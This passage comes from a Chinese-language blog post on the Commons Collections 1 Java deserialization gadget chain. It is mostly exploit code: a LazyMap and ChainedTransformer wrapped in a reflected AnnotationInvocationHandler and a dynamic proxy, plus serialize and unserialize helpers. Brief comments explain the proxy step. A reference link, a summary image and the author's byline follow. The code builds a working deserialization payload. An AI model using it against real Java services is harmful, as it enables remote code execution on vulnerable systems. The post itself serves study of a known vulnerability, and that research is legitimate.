        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value111", "xxx");
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);

        //使用对象代理
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);  //我们需要对 sun.reflect.annotation.AnnotationInvocationHandler 对象进行Proxy。代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是 sun.reflect.annotation.AnnotationInvocationHandler#readObject ，所以我们还需要再用 AnnotationInvocationHandler对这个proxyMap进行包裹：
        Object obj =  declaredConstructor.newInstance(Retention.class, proxyMap);  //把代理还是丢进构造器里面
        return obj;

    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(bout);
        objOut.writeObject(obj);
        return bout.toByteArray();
    }
    public static Object unserialize(final byte[] seria) throws Exception{
        ByteArrayInputStream btin = new ByteArrayInputStream(seria);
        ObjectInputStream ois = new ObjectInputStream(btin);
        return ois.readObject();
    }
}

```

https://johnfrod.top/%E5%AE%89%E5%85%A8/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/



总结：

![image-20231123140842662](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20231123140842662.png)

































---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/  

